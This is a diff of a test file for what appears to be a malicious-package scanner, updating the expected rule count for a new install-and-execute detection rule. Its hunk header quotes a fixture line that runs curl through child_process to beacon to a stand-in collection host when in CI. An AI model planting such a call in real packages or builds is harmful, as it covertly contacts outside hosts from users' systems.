@@ -315,11 +315,11 @@ if (isCI) { require('child_process').exec('curl http://collect.example.com/ci');
   // Rule count verification
   // =========================================================================
 
-  test('v8b: rule count is 270 RULES + 5 PARANOID (Track D +3, gyp_command_exec +1, gyp_phantom_exec +1, GHA-005/006 +2, lifecycle_version99 COMPOUND-018 +1, anti_analysis_evasion + analyzer_honeytoken_reference AST-095/096 +2, electron_app_injection AST-097 +1)', () => {
+  test('v8b: rule count is 271 RULES + 5 PARANOID (Track D +3, gyp_command_exec +1, gyp_phantom_exec +1, GHA-005/006 +2, lifecycle_version99 COMPOUND-018 +1, anti_analysis_evasion + analyzer_honeytoken_reference AST-095/096 +2, electron_app_injection AST-097 +1, install_native_drop_exec COMPOUND-020 +1)', () => {
     const { RULES, PARANOID_RULES } = require('../../src/rules/index.js');
     const ruleCount = Object.keys(RULES).length;
     const paranoidCount = Object.keys(PARANOID_RULES).length;
-    assert(ruleCount === 270, `Expected 270 RULES, got ${ruleCount}`);
+    assert(ruleCount === 271, `Expected 271 RULES, got ${ruleCount}`);
     assert(paranoidCount === 5, `Expected 5 PARANOID, got ${paranoidCount}`);
   });
 }
